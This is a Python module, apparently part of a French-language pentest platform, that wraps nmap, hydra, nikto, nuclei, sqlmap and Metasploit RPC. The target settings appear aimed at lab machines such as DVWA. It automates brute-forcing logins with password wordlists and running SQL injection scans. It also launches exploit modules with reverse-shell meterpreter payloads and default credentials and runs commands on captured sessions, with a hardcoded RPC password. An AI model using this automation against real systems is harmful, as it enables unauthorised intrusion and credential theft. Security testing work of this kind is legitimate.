import os
import socket
import subprocess
import json
import logging
import re
import tempfile
import time
from typing import Dict, List, Optional, Any
from datetime import datetime

logger = logging.getLogger(__name__)

def print_env_debug():
    print("\n=== DEBUG ENV (avant msfconsole) ===")
    print("hostname:", subprocess.getoutput("hostname"))
    print("whoami:", subprocess.getoutput("whoami"))
    print("pwd:", os.getcwd())
    print("which msfconsole:", subprocess.getoutput("which msfconsole"))
    print("PATH:", os.environ.get("PATH"))
    print("ip a:\n", subprocess.getoutput("ip a"))
    def get_ip(target="8.8.8.8"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 80))
            ip = s.getsockname()[0]
        except Exception:
            ip = "127.0.0.1"
        finally:
            s.close()
        return ip
    print("IP déterminée dynamiquement:", get_ip())
    print("=== END DEBUG ENV ===\n")


class HuntKitToolsManager:
    """Gestionnaire centralisé pour tous les outils HuntKit"""
    
    def __init__(self):
        self.tools_dir = os.getenv('TOOLS_DIR', '/opt')
        self.wordlists_dir = os.getenv('WORDLISTS_DIR', '/usr/share/wordlists')
        
        # Chemins des outils
        self.tools_paths = {
            'nmap': '/usr/bin/nmap',
            'hydra': '/usr/local/bin/hydra',
            'nikto': '/usr/local/bin/nikto',
            'nuclei': '/usr/local/bin/nuclei',
            'sqlmap': '/usr/local/bin/sqlmap',
            'msfconsole': '/usr/bin/msfconsole',
            'msfrun': '/usr/local/bin/msfrun'
        }
        
        # Wordlists communes
        self.wordlists = {
            'passwords': f'{self.wordlists_dir}/rockyou.txt',
            'common_passwords': f'{self.wordlists_dir}/top1000-passwords.txt',
            'common_dirs': f'{self.wordlists_dir}/common.txt'
        }
    

    def _find_metasploit_console(self) -> Optional[str]:
        """Trouve msfconsole dans votre installation existante"""
        import glob
        
        # Chemins possibles selon votre installation
        possible_paths = [
            '/opt/metasploit-framework/embedded/framework/msfconsole',  # Installation Rapid7
            '/opt/metasploit*/msfconsole',  # Pattern générique
            '/opt/metasploit-framework/msfconsole',  # Alternative
            '/usr/local/bin/msfconsole',   # Installation locale
            '/usr/bin/msfconsole'          # Installation système
        ]
        
        for path_pattern in possible_paths:
            if '*' in path_pattern:
                # Utiliser glob pour les patterns
                matches = glob.glob(path_pattern)
                for match in matches:
                    if os.path.isfile(match) and os.access(match, os.X_OK):
                        logger.info(f"🎯 msfconsole trouvé: {match}")
                        return match
            else:
                # Chemin direct
                if os.path.isfile(path_pattern) and os.access(path_pattern, os.X_OK):
                    logger.info(f"🎯 msfconsole trouvé: {path_pattern}")
                    return path_pattern
        
        # Fallback avec which
        try:
            result = subprocess.run(['which', 'msfconsole'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                path = result.stdout.strip()
                logger.info(f"🎯 msfconsole trouvé via which: {path}")
                return path
        except:
            pass
        
        logger.warning("⚠️ msfconsole non trouvé - Metasploit peut ne pas être disponible")
        return None

    def verify_tools(self) -> Dict[str, bool]:
        """Vérifie que tous les outils sont disponibles"""
        status = {}
        for tool, path in self.tools_paths.items():
            status[tool] = os.path.exists(path) or self._which(tool) is not None
        return status
    
    def _which(self, program: str) -> Optional[str]:
        """Équivalent de 'which' en Python"""
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if os.path.isfile(exe_file) and os.access(exe_file, os.X_OK):
                return exe_file
        return None

    
    def get_metasploit_info(self) -> Dict[str, Any]:
        """Informations détaillées sur l'installation Metasploit"""
        msf_path = self.tools_paths.get('msfconsole')
        
        if not msf_path:
            return {
                'installed': False,
                'error': 'msfconsole non trouvé',
                'searched_paths': [
                    '/opt/metasploit-framework/embedded/framework/msfconsole',
                    '/opt/metasploit*/msfconsole',
                    '/usr/local/bin/msfconsole',
                    '/usr/bin/msfconsole'
                ]
            }
        
        try:
            # Test de version
            result = subprocess.run([msf_path, '-v'], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                version = result.stdout.strip()
                installation_type = self._detect_installation_type(msf_path)
                
                return {
                    'installed': True,
                    'path': msf_path,
                    'version': version,
                    'installation_type': installation_type,
                    'working': True
                }
            else:
                return {
                    'installed': True,
                    'path': msf_path,
                    'working': False,
                    'error': result.stderr or 'Erreur lors du test de version'
                }
                
        except Exception as e:
            return {
                'installed': True,
                'path': msf_path,
                'working': False,
                'error': str(e)
            }
    
    def _detect_installation_type(self, msf_path: str) -> str:
        """Détecte le type d'installation Metasploit"""
        if '/opt/metasploit-framework' in msf_path:
            return 'rapid7_installer'  # Votre installation actuelle
        elif '/usr/bin' in msf_path:
            return 'package_manager'
        elif '/usr/local' in msf_path:
            return 'manual_install'
        else:
            return 'custom'
    

    
    def _run_command(self, command: List[str], timeout: int = 300, input_data: str = None) -> Dict[str, Any]:
        """Exécute une commande et retourne le résultat - VERSION AMÉLIORÉE"""
        try:
            logger.info(f"🔧 Exécution: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                input=input_data,
                check=False  # Ne pas lever d'exception sur code de retour non-zéro
            )
            
            logger.info(f"📊 Code retour: {result.returncode}")
            logger.debug(f"📝 Stdout ({len(result.stdout)} chars): {result.stdout[:200]}...")
            logger.debug(f"📝 Stderr ({len(result.stderr)} chars): {result.stderr[:200]}...")
            
            return {
                'success': result.returncode == 0,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'command': ' '.join(command)
            }
            
        except subprocess.TimeoutExpired:
            logger.error(f"⏰ Timeout ({timeout}s) pour: {' '.join(command)}")
            return {
                'success': False,
                'returncode': -1,
                'stdout': '',
                'stderr': f'Timeout après {timeout} secondes',
                'command': ' '.join(command)
            }
        except Exception as e:
            logger.error(f"❌ Erreur exécution: {e}")
            return {
                'success': False,
                'returncode': -1,
                'stdout': '',
                'stderr': str(e),
                'command': ' '.join(command)
            }


class NmapWrapper:
    """Wrapper pour Nmap"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def ping_scan(self, target: str, timeout: int = 300) -> Dict[str, Any]:
        """Scan de découverte (ping scan)"""
        command = ['nmap', '-sn', '-PE', '-PP', '-PM', target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_ping_scan(result['stdout'])
        
        return result
    
    def port_scan(self, target: str, ports: str = '1-1000', timeout: int = 600) -> Dict[str, Any]:
        """Scan de ports"""
        command = ['nmap', '-sS', '-p', ports, target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_port_scan(result['stdout'])
        
        return result
    
    def service_scan(self, target: str, ports: str = '22,80,443', timeout: int = 900) -> Dict[str, Any]:
        """Scan des services et versions"""
        command = ['nmap', '-sV', '-sC', '-p', ports, target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_service_scan(result['stdout'])
        
        return result
    
    def _parse_ping_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un ping scan"""
        hosts = []
        lines = output.split('\n')
        
        for line in lines:
            if 'Nmap scan report for' in line:
                # Extraire l'IP/hostname
                parts = line.split('Nmap scan report for ')
                if len(parts) > 1:
                    host_info = parts[1].strip()
                    hosts.append({'host': host_info, 'status': 'up'})
        
        return {
            'hosts_found': hosts,
            'total_hosts': len(hosts)
        }
    
    def _parse_port_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un port scan"""
        return {'raw_output': output}  # Parsing détaillé à implémenter selon besoins
    
    def _parse_service_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un service scan"""
        return {'raw_output': output}  # Parsing détaillé à implémenter selon besoins


class HydraWrapper:
    """Wrapper pour Hydra"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def brute_force(self, target: str, service: str, username: str = None, 
                   userlist: str = None, password: str = None, 
                   passwordlist: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Attaque par force brute - VERSION CORRIGÉE POUR HTTP"""
        
        command = ['hydra']
        
        # Utilisateur(s)
        if username:
            command.extend(['-l', username])
        elif userlist:
            command.extend(['-L', userlist])
        else:
            command.extend(['-l', 'admin'])  # Valeur par défaut
        
        # Mot(s) de passe
        if password:
            command.extend(['-p', password])
        elif passwordlist:
            command.extend(['-P', passwordlist])
        else:
            # Utiliser la wordlist par défaut
            default_wordlist = self.tools.wordlists.get('common_passwords')
            if os.path.exists(default_wordlist):
                command.extend(['-P', default_wordlist])
            else:
                command.extend(['-p', 'password'])  # Fallback
        
        # ✅ CORRECTION PRINCIPALE : Gestion spécifique des services HTTP
        if service == 'http-post-form':
            # Configuration spécifique pour DVWA ou formulaires web
            if '172.20.0.' in target or '8080' in str(target):
                # DVWA spécifique
                form_params = "/login.php:username=^USER^&password=^PASS^:Login failed"
                command.extend([target, 'http-post-form', form_params])
            elif 'login' in target.lower() or 'dvwa' in target.lower():
                # Autres applications web avec login
                form_params = "/login.php:username=^USER^&password=^PASS^:incorrect"
                command.extend([f'{target}', 'http-post-form', form_params])
            else:
                # Configuration générique pour formulaire web
                form_params = "/login:username=^USER^&password=^PASS^:failed"
                command.extend([f'{target}', 'http-post-form', form_params])
        
        elif service == 'http-get':
            # HTTP Basic Auth
            command.extend([target, 'http-get', '/'])
        
        else:
            # Services standards (SSH, FTP, etc.)
            command.extend([target, service])
        
        # Options additionnelles
        command.extend(['-t', '4', '-f'])  # 4 threads, arrêt à la première trouvaille
        
        # ✅ AMÉLIORATION : Log de la commande pour debug
        logger.info(f"🔨 Commande Hydra: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        # ✅ AMÉLIORATION : Log du résultat pour debug
        if not result['success']:
            logger.error(f"❌ Hydra stderr: {result['stderr']}")
            logger.error(f"❌ Hydra stdout: {result['stdout']}")
        
        if result['success']:
            result['parsed'] = self._parse_hydra_output(result['stdout'])
        
        return result

    def detect_login_form(self, target: str) -> str:
        """Détecte automatiquement la configuration du formulaire de login"""
        try:
            import requests
            
            # Essayer de récupérer la page de login
            if not target.startswith('http'):
                test_urls = [
                    f"http://{target}/login.php",
                    f"http://{target}/login",
                    f"http://{target}/admin",
                    f"http://{target}"
                ]
            else:
                test_urls = [target]
            
            for url in test_urls:
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        content = response.text.lower()
                        
                        # Détecter DVWA
                        if 'dvwa' in content or 'damn vulnerable' in content:
                            return "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
                        
                        # Détecter d'autres formulaires
                        if 'password' in content and 'username' in content:
                            return "/login:username=^USER^&password=^PASS^:incorrect"
                            
                except:
                    continue
            
            # Fallback générique
            return "/login:username=^USER^&password=^PASS^:failed"
            
        except Exception as e:
            logger.warning(f"⚠️ Impossible de détecter le formulaire: {e}")
            return "/login:username=^USER^&password=^PASS^:failed"

    def _parse_hydra_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de Hydra - VERSION AMÉLIORÉE"""
        found_credentials = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Format classique: [service][port] host: login: password:
            if '[' in line and '] ' in line and 'login:' in line and 'password:' in line:
                try:
                    # Extraire après le premier '] '
                    parts = line.split('] ', 1)[1]
                    
                    if 'login:' in parts and 'password:' in parts:
                        # Split sur 'login:' puis 'password:'
                        login_part = parts.split('login:')[1].split('password:')[0].strip()
                        password_part = parts.split('password:')[1].strip()
                        
                        found_credentials.append({
                            'login': login_part,
                            'password': password_part,
                            'service': self._extract_service_from_line(line)
                        })
                        
                except Exception as e:
                    logger.debug(f"Erreur parsing ligne Hydra: {line} - {e}")
                    continue
            
            # Format alternatif pour HTTP
            elif 'valid password found' in line.lower():
                # Format: "login: admin password: password"
                if 'login:' in line and 'password:' in line:
                    try:
                        import re
                        login_match = re.search(r'login:\s*(\S+)', line)
                        password_match = re.search(r'password:\s*(\S+)', line)
                        
                        if login_match and password_match:
                            found_credentials.append({
                                'login': login_match.group(1),
                                'password': password_match.group(1),
                                'service': 'http'
                            })
                    except:
                        continue
        
        return {
            'credentials_found': found_credentials,
            'total_found': len(found_credentials),
            'raw_output': output
        }

    def _extract_service_from_line(self, line: str) -> str:
        """Extrait le service de la ligne de résultat Hydra"""
        if '[http-post-form]' in line:
            return 'http-post-form'
        elif '[ssh]' in line:
            return 'ssh'
        elif '[ftp]' in line:
            return 'ftp'
        else:
            return 'unknown'


class NiktoWrapper:
    """Wrapper pour Nikto - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def web_scan(self, target: str, port: int = 80, ssl: bool = False, 
                timeout: int = 1800) -> Dict[str, Any]:
        """Scan de vulnérabilités web - VERSION CORRIGÉE"""
        
        protocol = 'https' if ssl else 'http'
        default_port = 443 if ssl else 80
        
        if port == default_port:
            url = f"{protocol}://{target}"
        else:
            url = f"{protocol}://{target}:{port}"
        
        # 🔥 CORRECTION: Retirer -Format txt qui cause l'erreur
        command = [
            'nikto',
            '-h', url,
            '-timeout', '15',
            '-maxtime', '600',
            '-nointeractive'
        ]
        
        logger.info(f"🕷️ Commande Nikto: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        # Debug : afficher stderr si erreur
        if not result['success']:
            logger.error(f"❌ Nikto stderr: {result['stderr']}")
        
        result['parsed'] = self._parse_nikto_output(result['stdout'])
        
        return result
    
    def _parse_nikto_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de Nikto - VERSION AMÉLIORÉE"""
        vulnerabilities = []
        lines = output.split('\n')
        
        logger.info(f"📝 Nikto: {len(lines)} lignes à analyser")
        
        for line in lines:
            line = line.strip()
            
            # Lignes qui commencent par + sont des vulnérabilités/informations
            if line.startswith('+ ') and len(line) > 2:
                vuln = line[2:].strip()  # Retirer '+ '
                # Filtrer les lignes d'info non importantes
                if vuln and not any(skip in vuln.lower() for skip in [
                    'target ip:', 'target hostname:', 'target port:', 'start time:'
                ]):
                    vulnerabilities.append(vuln)
                    logger.debug(f"🕷️ Vulnérabilité Nikto: {vuln[:100]}...")
        
        logger.info(f"🕷️ Nikto: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities)
        }


class NucleiWrapper:
    """Wrapper pour Nuclei - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def vulnerability_scan(self, target: str, templates: str = None, 
                          severity: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Scan de vulnérabilités avec Nuclei - VERSION CORRIGÉE"""
        
        # 🔥 CORRECTION: Utiliser -jsonl au lieu de -json
        command = ['nuclei', '-u', target, '-jsonl', '-silent']
        
        # Templates
        if templates:
            command.extend(['-t', templates])
        
        # Sévérité
        if severity:
            command.extend(['-severity', severity])
        else:
            command.extend(['-severity', 'medium,high,critical'])
        
        # Options corrigées
        command.extend([
            '-timeout', '10',
            '-retries', '1',
            '-no-color'
        ])
        
        logger.info(f"🎯 Commande Nuclei: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        if result['returncode'] != 0:
            logger.warning(f"⚠️ Nuclei stderr: {result['stderr']}")
        
        result['parsed'] = self._parse_nuclei_output(result['stdout'])
        
        return result
    
    def _parse_nuclei_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie JSON de Nuclei - VERSION AMÉLIORÉE"""
        vulnerabilities = []
        lines = output.strip().split('\n')
        
        logger.info(f"📝 Nuclei: {len(lines)} lignes à parser")
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line:
                continue
                
            try:
                # Tenter de parser chaque ligne comme JSON
                vuln_data = json.loads(line)
                vulnerabilities.append(vuln_data)
                logger.debug(f"✅ Ligne {line_num}: {vuln_data.get('template-id', 'unknown')}")
                
            except json.JSONDecodeError as e:
                # Si ce n'est pas du JSON, peut-être un message d'erreur ou d'info
                logger.debug(f"⚠️ Ligne {line_num} non-JSON: {line[:50]}...")
                continue
        
        logger.info(f"🎯 Nuclei: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities),
            'raw_lines': len(lines)
        }


class SQLMapWrapper:
    """Wrapper pour SQLMap - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def sql_injection_scan(self, target: str, data: str = None, 
                          cookie: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Scan d'injection SQL - VERSION CORRIGÉE POUR DVWA"""
        
        # 🔥 CORRECTION: URL spécifique DVWA avec authentification
        if '172.20.0.10' in target:
            # DVWA nécessite d'être connecté
            if 'vulnerabilities' not in target:
                test_url = f"{target.rstrip('/')}/vulnerabilities/sqli/?id=1&Submit=Submit"
            else:
                test_url = target if '?' in target else f"{target}?id=1&Submit=Submit"
            
            # Cookie avec session et sécurité basse
            dvwa_cookie = "security=low; PHPSESSID=dvwatest123"
        else:
            test_url = target if '?' in target else f"{target.rstrip('/')}?id=1&Submit=Submit"
            dvwa_cookie = cookie
        
        command = ['sqlmap', '-u', test_url, '--batch', '--random-agent']
        
        # Cookie DVWA obligatoire
        if dvwa_cookie:
            command.extend(['--cookie', dvwa_cookie])
        
        # 🔥 CORRECTION: Paramètres plus agressifs pour DVWA
        command.extend([
            '--level=1',           # Niveau maximum
            '--risk=1',            # Risque maximum
            '--timeout=5',         
            '--retries=1',         
            '--technique=BEUSTQ',  # Toutes les techniques
            '--flush-session',     
            '--fresh-queries',
            '--forms',             # Détecter les formulaires
            '--crawl=2'            # Explorer 2 niveaux
        ])
        
        logger.info(f"💉 Commande SQLMap: {' '.join(command)}")
        logger.info(f"💉 URL testée: {test_url}")
        
        result = self.tools._run_command(command, timeout)
        
        # Toujours parser même si pas d'injection trouvée
        result['parsed'] = self._parse_sqlmap_output(result['stdout'] + result['stderr'])
        
        return result
    
    def _parse_sqlmap_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de SQLMap - VERSION AMÉLIORÉE"""
        
        # Rechercher les indicateurs d'injection
        vulnerable_params = []
        injection_types = []
        
        lines = output.split('\n')
        logger.info(f"📝 SQLMap: {len(lines)} lignes à analyser")
        
        for line in lines:
            line_lower = line.lower()
            
            # Détection d'injections
            if 'parameter' in line_lower and 'vulnerable' in line_lower:
                vulnerable_params.append(line.strip())
                logger.info(f"🚨 Paramètre vulnérable: {line.strip()}")
            
            # Types d'injection détectés
            if 'type:' in line_lower and any(x in line_lower for x in ['boolean', 'time', 'union', 'error', 'stacked']):
                injection_types.append(line.strip())
                logger.info(f"💉 Type d'injection: {line.strip()}")
            
            # Indicateurs de succès plus larges
            success_indicators = [
                'sqlmap identified',
                'injection point',
                'database management system',
                'back-end dbms',
                'appears to be',
                'seems to be',
                'might be injectable'
            ]
            
            if any(keyword in line_lower for keyword in success_indicators):
                logger.info(f"✅ Indicateur positif: {line.strip()}")
                if 'appears to be' in line_lower or 'seems to be' in line_lower:
                    vulnerable_params.append(f"Détection: {line.strip()}")
        
        # Analyser le niveau de confiance
        injection_found = len(vulnerable_params) > 0 or len(injection_types) > 0
        
        logger.info(f"💉 SQLMap résultat: injection_found={injection_found}, vulns={len(vulnerable_params)}")
        
        return {
            'vulnerable_parameters': vulnerable_params,
            'injection_types': injection_types,
            'injection_found': injection_found,
            'raw_analysis': f"Analysé {len(lines)} lignes, trouvé {len(vulnerable_params)} indicateurs"
        }


# ===== NOUVEAU : WRAPPER METASPLOIT =====
class MetasploitWrapper:
    """Wrapper pour Metasploit Framework via RPC persistant - VERSION CORRIGÉE"""

    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
        
        # ✅ CORRECTION PRINCIPALE: Utiliser le client RPC persistant
        self.rpc_client = None
        self._init_rpc_client()
        
        # Conserver les modules pour compatibilité
        self.version_scanners = {
            'ssh': 'auxiliary/scanner/ssh/ssh_version',
            'ftp': 'auxiliary/scanner/ftp/ftp_version', 
            'smb': 'auxiliary/scanner/smb/smb_version',
            'http': 'auxiliary/scanner/http/http_version',
            'mysql': 'auxiliary/scanner/mysql/mysql_version',
            'postgresql': 'auxiliary/scanner/postgres/postgres_version',
            'telnet': 'auxiliary/scanner/telnet/telnet_version',
            'vnc': 'auxiliary/scanner/vnc/vnc_none_auth'
        }
        
        self.login_scanners = {
            'ssh': 'auxiliary/scanner/ssh/ssh_login',
            'ftp': 'auxiliary/scanner/ftp/ftp_login', 
            'smb': 'auxiliary/scanner/smb/smb_login',
            'http': 'auxiliary/scanner/http/http_login',
            'mysql': 'auxiliary/scanner/mysql/mysql_login',
            'postgresql': 'auxiliary/scanner/postgres/postgres_login',
            'telnet': 'auxiliary/scanner/telnet/telnet_login',
            'vnc': 'auxiliary/scanner/vnc/vnc_login'
        }
        
        self.common_payloads = {
            'linux': 'linux/x64/meterpreter/reverse_tcp',
            'windows': 'windows/meterpreter/reverse_tcp',
            'php': 'php/meterpreter_reverse_tcp',
            'java': 'java/meterpreter/reverse_tcp'
        }

    def _init_rpc_client(self):
        """Initialise le client RPC de façon lazy"""
        try:
            # Import local pour éviter les dépendances au niveau module
            from .metasploit_rpc_client import MetasploitRPCClient
            
            self.rpc_client = MetasploitRPCClient(
                host='127.0.0.1',
                port=55552,
                username='msf',
                password='msfrpc123',
                ssl=False
            )
            
            logger.info("✅ Client RPC Metasploit initialisé")
            
        except Exception as e:
            logger.error(f"❌ Erreur init RPC client: {e}")
            self.rpc_client = None

    def test_metasploit_availability(self) -> Dict[str, Any]:
        """Teste la disponibilité de Metasploit via RPC"""
        if not self.rpc_client:
            return {
                'available': False,
                'error': 'Client RPC non initialisé'
            }
        
        return self.rpc_client.test_metasploit_availability()

    def run_exploit_module(self, target: str, port: int, exploit_module: str, 
                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
        """Lance un module d'exploitation via RPC persistant"""
        if not self.rpc_client:
            return {
                'success': False,
                'error': 'Client RPC non disponible'
            }
        
        try:
            logger.info(f"🎯 Exploitation RPC: {exploit_module} sur {target}:{port}")
            
            # Options par défaut
            rpc_options = options.copy() if options else {}
            
            # Ajouter credentials par défaut pour SSH
            if 'ssh' in exploit_module.lower() and 'sshexec' in exploit_module:
                if 'USERNAME' not in rpc_options:
                    rpc_options['USERNAME'] = 'msfadmin'
                if 'PASSWORD' not in rpc_options:
                    rpc_options['PASSWORD'] = 'msfadmin'
            
            # Lancer l'exploitation via RPC
            result = self.rpc_client.run_exploit(
                exploit_module=exploit_module,
                options=rpc_options,
                target=target,
                port=port
            )
            
            logger.info(f"🎯 Exploitation terminée: {result.get('success', False)}")
            return result
            
        except Exception as e:
            logger.error(f"❌ Erreur exploitation RPC: {e}")
            return {
                'success': False,
                'error': str(e),
                'exploit_module': exploit_module,
                'target': f"{target}:{port}"
            }

    def run_auxiliary_scan(self, target: str, port: int, service: str, 
                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
        """Lance un module auxiliaire via console RPC"""
        if not self.rpc_client:
            return {
                'success': False,
                'error': 'Client RPC non disponible'
            }
        
        try:
            # Déterminer le module selon le service
            module = options.get('explicit_module') if options else None
            
            if not module:
                scan_type = options.get('scan_type', 'version') if options else 'version'
                
                if scan_type == 'version' and service.lower() in self.version_scanners:
                    module = self.version_scanners[service.lower()]
                elif scan_type == 'login' and service.lower() in self.login_scanners:
                    module = self.login_scanners[service.lower()]
                else:
                    module = 'auxiliary/scanner/portscan/tcp'
            
            logger.info(f"🔍 Scan auxiliaire RPC: {module} sur {target}:{port}")
            
            # Construire les commandes
            commands = [
                f"use {module}",
                f"set RHOSTS {target}",
                f"set RPORT {port}",
                "set THREADS 10",
                "set VERBOSE true"
            ]
            
            # Ajouter les options valides
            valid_options = {'USERNAME', 'PASSWORD', 'USER_FILE', 'PASS_FILE'}
            if options:
                for key, value in options.items():
                    if key.upper() in valid_options:
                        commands.append(f"set {key.upper()} {value}")
            
            commands.append("run")
            
            # Exécuter via console RPC
            output = ""
            for cmd in commands:
                result = self.rpc_client.execute_console_command(cmd)
                if result and result.get('success'):
                    output += f"[{cmd}]\n{result['output']}\n"
            
            # Parser selon le module
            parsed_result = self._parse_auxiliary_output(output, module)
            
            return {
                'success': True,
                'module': module,
                'target': f"{target}:{port}",
                'service': service,
                'raw_output': output,
                'parsed_result': parsed_result
            }
            
        except Exception as e:
            logger.error(f"❌ Erreur scan auxiliaire RPC: {e}")
            return {
                'success': False,
                'error': str(e),
                'target': f"{target}:{port}",
                'service': service
            }

    def get_active_sessions(self, timeout: int = 60) -> Dict[str, Any]:
        """Récupère les sessions actives via RPC persistant"""
        if not self.rpc_client:
            return {
                'success': False,
                'error': 'Client RPC non disponible',
                'sessions': []
            }
        
        try:
            logger.info("🎯 Récupération sessions via RPC...")
            result = self.rpc_client.get_sessions()
            
            logger.info(f"🎯 Sessions RPC: {len(result.get('sessions', []))} trouvées")
            return result
            
        except Exception as e:
            logger.error(f"❌ Erreur sessions RPC: {e}")
            return {
                'success': False,
                'error': str(e),
                'sessions': []
            }

    def execute_session_command(self, session_id: str, command: str, timeout: int = 300) -> Dict[str, Any]:
        """Exécute une commande sur une session via RPC persistant"""
        if not self.rpc_client:
            return {
                'success': False,
                'error': 'Client RPC non disponible'
            }
        
        try:
            logger.info(f"🔧 Commande RPC session {session_id}: {command}")
            
            result = self.rpc_client.execute_session_command(session_id, command)
            
            logger.info(f"🔧 Commande RPC terminée: {result.get('success', False)}")
            return result
            
        except Exception as e:
            logger.error(f"❌ Erreur commande RPC session {session_id}: {e}")
            return {
                'success': False,
                'session_id': session_id,
                'command': command,
                'error': str(e)
            }

    # ===== MÉTHODES INCHANGÉES (pour compatibilité) =====
    
    def search_exploits(self, service: str = None, platform: str = None, cve: str = None):
        """Recherche d'exploits - mode dégradé sans RPC"""
        # Garder l'implémentation existante pour les recherches
        return {
            'success': False,
            'error': 'Recherche non disponible en mode RPC'
        }
    
    def parse_sessions_from_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse les sessions depuis la sortie - conservé pour compatibilité"""
        if self.rpc_client:
            return self.rpc_client._parse_sessions_from_output(output)
        
        # Fallback vers l'ancienne méthode
        sessions = []
        lines = output.split('\n')
        
        for line in lines:
            line_lower = line.lower().strip()
            
            session_match = re.search(r'(\w+)\s+session\s+(\d+)\s+opened\s+\(([^)]+)\)', line, re.IGNORECASE)
            if session_match:
                session_type = session_match.group(1).lower()
                session_id = session_match.group(2)
                connection_info = session_match.group(3)
                
                if '->' in connection_info:
                    parts = connection_info.split('->')
                    if len(parts) == 2:
                        target_info = parts[1].strip()
                        if ':' in target_info:
                            target_ip = target_info.split(':')[0]
                            target_port = target_info.split(':')[1]
                        else:
                            target_ip = target_info
                            target_port = None
                        
                        sessions.append({
                            'session_id': session_id,
                            'session_type': session_type,
                            'target_ip': target_ip,
                            'target_port': int(target_port) if target_port else None,
                            'connection_info': connection_info,
                            'detected_at': datetime.now().isoformat()
                        })
        
        return sessions

    def _parse_auxiliary_output(self, output: str, module: str) -> Dict[str, Any]:
        """Parse la sortie d'un module auxiliaire - INCHANGÉ"""
        # Garder l'implémentation existante
        result = {
            'scan_completed': True,
            'credentials_found': [],
            'hosts_discovered': [],
            'vulnerabilities': [],
            'directories_found': [],
            'services_detected': [],
            'errors': [],
            'module_status': 'completed'
        }
        
        lines = output.split('\n')
        logger.info(f"📝 Parsing {len(lines)} lignes pour module: {module}")
        
        for line in lines:
            line_lower = line.lower()
            line_stripped = line.strip()
            
            # Détecter les répertoires trouvés
            if '[+] found http' in line_lower:
                url_match = re.search(r'\[\+\]\s+found\s+(https?://[^\s]+)\s+(\d+)(?:\s+\([^)]+\))?', line, re.IGNORECASE)
                
                if url_match:
                    url = url_match.group(1)
                    status_code = url_match.group(2)
                    
                    is_accessible = status_code in ['200', '301', '302']
                    is_interesting = status_code in ['403', '401', '500']
                    
                    directory_info = {
                        'url': url,
                        'status_code': status_code,
                        'accessible': is_accessible,
                        'interesting': is_interesting,
                        'security_risk': 'high' if is_accessible else 'medium' if is_interesting else 'low'
                    }
                    
                    result['directories_found'].append(directory_info)
                    
                    if is_accessible:
                        vuln_msg = f"🚨 RÉPERTOIRE ACCESSIBLE: {url} (HTTP {status_code})"
                    elif is_interesting:
                        vuln_msg = f"⚠️ RÉPERTOIRE PROTÉGÉ: {url} (HTTP {status_code})"
                    else:
                        vuln_msg = f"📁 Répertoire détecté: {url} (HTTP {status_code})"
                    
                    result['vulnerabilities'].append(vuln_msg)
                    logger.info(f"📁 Répertoire trouvé: {url} (HTTP {status_code}) - Accessible: {is_accessible}")
            
            # Détecter les credentials
            elif any(keyword in line_lower for keyword in ['login successful', 'valid credentials', 'success:']):
                cred_match = re.search(r'(\w+):(\w+)', line)
                if cred_match:
                    result['credentials_found'].append({
                        'username': cred_match.group(1),
                        'password': cred_match.group(2),
                        'service': module.split('/')[-1] if '/' in module else 'unknown'
                    })
            
            # Détecter les erreurs
            elif 'auxiliary aborted' in line_lower:
                result['module_status'] = 'aborted'
                result['errors'].append(f"Module interrompu: {line_stripped}")
        
        return result

    def cleanup(self):
        """Nettoie les ressources RPC"""
        if self.rpc_client:
            self.rpc_client.cleanup()
            logger.info("🧹 Client RPC nettoyé")


# ===== CLASSE PRINCIPALE =====
class HuntKitIntegration:
    """Intégration principale pour utiliser HuntKit avec Celery - VERSION COMPLÈTE CORRIGÉE"""
    
    def __init__(self):
        self.tools_manager = HuntKitToolsManager()
        self.nmap = NmapWrapper(self.tools_manager)
        self.hydra = HydraWrapper(self.tools_manager)
        self.nikto = NiktoWrapper(self.tools_manager)
        self.nuclei = NucleiWrapper(self.tools_manager)
        self.sqlmap = SQLMapWrapper(self.tools_manager)
